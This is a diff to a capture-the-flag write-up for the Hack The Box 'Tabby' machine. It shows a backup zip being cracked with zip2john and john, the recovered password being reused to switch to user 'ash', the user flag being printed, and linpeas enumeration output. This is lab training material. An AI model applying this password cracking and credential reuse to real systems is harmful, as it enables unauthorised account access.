@@ -494,3 +494,98 @@ Writable: /var/log/tomcat9/catalina.2020-11-08.log
 -rw-r--r-- 1 ash ash 8716 Jun 16 13:42 /var/www/html/files/16162020_backup.zip
 -rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
 ```
+
+* Used netcat to transfer the /var/www/html/files/16162020_backup.zip to local machine and crack the password.
+```
+kali@kali:~/HTB/tabby$ zip2john 16162020_backup.zip > ziphash
+16162020_backup.zip/var/www/html/assets/ is not encrypted!                                    
+ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, dec
+mplen=766, crc=282B6DE2
+ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decm
+plen=14793, crc=285CC4D6
+ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmp
+len=2894, crc=2F9F45F
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmpl
+en=123, crc=5C67F19E
+ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decm
+plen=1574, crc=32DB9CE3
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+
+kali@kali:~/HTB/tabby$ john ziphash -w=/home/kali/Tools/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (16162020_backup.zip)
+1g 0:00:00:03 DONE (2020-11-08 11:15) 0.3246g/s 3363Kp/s 3363Kc/s 3363KC/s adnc153..adilizinha
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+* Tested password with ash user. Successful
+```
+$ su ash 
+su ash 
+Password: admin@it
+
+ash@tabby:/tmp$ cd /home/ash 
+cd /home/ash
+ash@tabby:~$ cat user.txt
+cat user.txt
+c1078b3d1b7c96fe4394817cc528e4f8
+```
+* Run linpeas again using ash user.
+```
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+/dev/disk/by-uuid/0aadaa55-9138-4c0d-b1dc-fe8a382110f0 / ext4 defaults 0 0
+/swap.img       none    swap    sw      0       0
+
+
+====================================( Available Software )====================================
+[+] Useful software
+/usr/bin/nc
+/usr/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+/usr/bin/ping
+/usr/bin/base64
+/usr/bin/python3
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/sudo
+
+[+] Installed Compiler
+/snap/core18/1705/usr/share/gcc-8
+/usr/share/gcc-10
+/usr/share/bash-completion/completions/gcc-5
+/usr/share/bash-completion/completions/gcc-6
+/usr/share/bash-completion/completions/gcc-7
+/usr/share/bash-completion/completions/gcc-8
+
+
+[+] Readable files belonging to root and readable by me but not world readable                                    
+-rw-r----- 1 root adm 10769 Jun 17 16:03 /var/log/apache2/access.log.1                                            
+-rw-r----- 1 root adm 869 Nov  8 14:45 /var/log/apache2/error.log.1                                               
+-rw-r----- 1 root adm 824 Nov  8 14:45 /var/log/apache2/access.log                                                
+-rw-r----- 1 root adm 0 May 21 10:31 /var/log/apache2/other_vhosts_access.log                                     
+-rw-r----- 1 root adm 936 Jun 20 20:59 /var/log/apache2/error.log.2.gz                                            
+-rw-r----- 1 root adm 239 Nov  8 14:45 /var/log/apache2/error.log                                                 
+-rw-r----- 1 root adm 2423 Jun 16 16:42 /var/log/apache2/access.log.2.gz                                          
+-rw-r----- 1 root adm 1521 Jun 16 21:26 /var/log/apache2/error.log.3.gz                                           
+-rw-r----- 1 root adm 581 Jun 17 16:22 /var/log/apt/term.log.1.gz                                                 
+-rw-r----- 1 root adm 0 Nov  8 14:45 /var/log/apt/term.log                                                        
+-rw-r----- 1 root adm 10619 May 21 13:16 /var/log/apt/term.log.2.gz                                               
+                                                                                                                  
+[+] Modified interesting files in the last 5mins                                                                  
+/var/log/auth.log                                                                                                 
+/var/log/journal/c72a21e67341466eacf74373cf80aca6/user-1000.journal                                               
+/var/log/journal/c72a21e67341466eacf74373cf80aca6/system.journal                                                  
+/var/log/syslog                                                                                                   
+/home/ash/.gnupg/trustdb.gpg                                                                                      
+/home/ash/.gnupg/pubring.kbx                                                                                      
+```
